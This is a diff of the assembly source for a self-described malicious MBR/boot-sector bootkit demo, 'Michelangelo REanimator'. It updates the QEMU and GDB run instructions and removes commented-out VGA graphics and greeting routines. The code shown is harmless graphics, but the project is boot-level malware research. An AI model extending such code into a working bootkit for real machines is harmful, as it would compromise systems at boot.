@@ -4,7 +4,7 @@
 
 
 ;******************************************************************************
-;	This is the working demo of the malicious MBR/boot sector portion
+;	This is the working demo of stage 1 of the malicious MBR/boot sector
 ; 	of the Michelangelo REanimator bootkit
 ;	
 ;	Use at your own risk. 
@@ -20,7 +20,14 @@
 ;	nasm -f bin -o michelange_grafx_routines.mbr michelange_grafx_routines.mbr
 ;	
 ;	To run;
-;	qemu-system-i386 -hda michelange_grafx_routines.mbr
+;	qemu-system-i386 -m 16 -rtc base=localtime -device cirrus-vga -display gtk -hda dos_rip.img 
+;	Note: the -rtc -device and -display flag values are all based on what 
+;   I've used on my own machine as configurations that work well for my use cases.  
+;   You may need to adjust them as needed for your own host machine and 
+;   what you have installed.
+;	To run in a debug session with GDB attached:
+;	qemu-system-i386 -m 16 -rtc base=localtime -device cirrus-vga -display gtk -hda dos_rip.img -s -S
+;	(see debugging notes for details on setup of GDBi/Bochs session) 
 ;
 ;
 ;******************************************************************************
@@ -237,208 +244,3 @@ VXend:
 	db 0x55
 	db 0xAA
 
-;VXPaintBuffer: 
-;	times 512-($-$$) db 0
-
-;
-;vga_init:
-;	mov	ax,0xA000
-;	mov	es,ax
-;	mov	dx,ax
-;	mov	di,0
-;	mov	ax, 0x13
-;	int	10h
-;	cld
-;;	jmp paint_setup
-;;	jmp bmp_setup
-;
-;gen_rand_num:
-;	push ax
-;	push es
-;	xor ax, ax
-;	mov es,ax
-;	mov ax, es:[46Ch] ;offset of var for internal timer in BPB
-;	mov [randtimer], al
-;	mov [randshiftnum], ah
-;	pop es
-;	pop ax
-;	cmp word [randtimer], 30
-;	jge gen_rand_shifts
-;	mov [randshift0], ax
-;	;jmp paint_setup
-;	jmp set_pal
-;
-;gen_rand_shifts:
-;	push ax
-;	mov ax, [randtimer]
-;	add ax, [randshiftnum]
-;	mov [randshift0], ax
-;	pop ax
-;	jmp paint_setup
-;;;	randshift0 equ (randtimer+randshiftnum)
-;
-;set_pal:
-;	salc				;set carry flag in al, if carry flag set, al=0
-;	mov	dx,VGA_PAL_INDEX	;
-;	out	dx, al
-;	inc	dx
-;	pal_1:
-;		;or ax, [randshift0]
-;		or	ax,0000111100110011b
-;		or ax, [randtimer]
-;		push	ax
-;		shr	ax, 10
-;		;shr	ax, randshift0
-;		out	dx,al
-;		mul	al
-;		;shl	ax, randshift1
-;		shl	ax, 6
-;		out 	dx,al
-;		pop	ax
-;		out	dx,al
-;		inc	ax
-;		jnz	pal_1
-;	;jmp 	bmp_setup
-;
-;
-;paint_setup:
-;;	mov cx, 8
-;	mov	cx, SCALED_SCREEN_W
-;;	shl cx, 1
-;	xor di, di
-;	paint_loop:
-;		push 	di
-;		push	cx
-;		mbr_paint:
-;			;lea si, MichelAngeBitmap
-;			;mov si, VXPaintBuffer
-;			
-;			push cs
-;			pop ds
-;			
-;			;mov ax, 0x07e0
-;			;mov ds, ax
-;			;xor si, si
-;			
-;			;mov si, 0x7E00
-;			;lea si, VXPaintBuffer
-;			;lea si, VXPaintBuffer
-;			mov si, 0x600
-;			;mov si, 0x200
-;			push si
-;			mov bx, SCALED_SCREEN_MAX
-;			vga_mbr_y:
-;				push di
-;				mov dx, SCALED_SCREEN_W
-;				vga_mbr_x:
-;					mov ax, ds:[si]
-;					;mov ax, [si]
-;					or al, es:[di]
-;					add al, 0x01
-;					;add al, [randtimer]
-;					;add al, [randshiftnum]
-;					mov es:[di], al 
-;					;mov es:[di+2], al 
-;					inc si
-;					inc di
-;					;add di, 4
-;					dec dx
-;					jnz vga_mbr_x
-;				pop di
-;				;add di, 320
-;				add di, OFFSET_SCREEN_H
-;				dec bx
-;				jnz vga_mbr_y
-;			pop si
-;		pop		cx
-;		pop 	di
-;		add		di, SCALED_SCREEN_W
-;		dec 	cx
-;		jnz	paint_loop
-;
-;
-;rsvp:
-;	mov cx, greetz_len
-;	mov si, greetz
-;	push cs
-;	pop ds
-;welcome:
-;	mov al, [si]
-;	mov bh, 0
-;	mov bl, 0x0F
-;	mov ah, 0x0E
-;	int 0x10
-;	inc si
-;	dec cx
-;	jnz welcome
-;	jmp key_check
-;
-;randtimercheck:
-;	mov cx, 2
-;	mov si, randtimer
-;	push cs
-;	pop ds
-;randtimerprint:
-;	mov al, [si]
-;	mov bh, 0
-;	mov bl, 0x0F
-;	mov ah, 0x0E
-;	int 0x10
-;	inc si
-;	dec cx
-;	jnz randtimerprint
-;	jmp key_check
-;
-;;******************************************************************************
-;;
-;;	Reads char from buffer (function 0h,int16h)
-;; 	Char returned in al
-;; 	If char in al == 0x1b (ESC) then terminate program
-;;	Else, continue VGA *~pretty picture~* loop
-;;
-;;******************************************************************************
-;key_check:
-;	xor	ax,ax
-;	int	16h
-;	;;check for keypress
-;	cmp	al, 1
-;	jnz	baibai
-;;******************************************************************************
-;;
-;;	Terminates program (function 4Ch,int21h)
-;;
-;;******************************************************************************
-;baibai:
-;	hlt	
-;	jmp baibai
-;	;mov	ax,4C00h		;terminate program
-;	;int	21h
-;
-;greetz:
-;	db "u know u luv me", 0Dh, 0Ah
-;	db "xoxo", 0Dh, 0Ah
-;	db "ic3qu33n", 0Dh, 0Ah
-;
-;greetz_len	equ $-greetz
-;	
-;randtimer:
-;	db 0
-;randshiftnum:
-;	db 0
-;randshift0:
-;	db 0
-;
-;randshift1 equ (randshift0 - 2)
-;	
-;VXend:
-;	times 510-($-$$) db 0
-;	db 0x55
-;	db 0xAA
-;
-;;.data:
-;;org 0x7e00
-;;VXPaintBuffer equ  3569JXZghikms0x7e00
-;VXPaintBuffer: 
-;	times 10240-($-$$) db 0
-;
-;
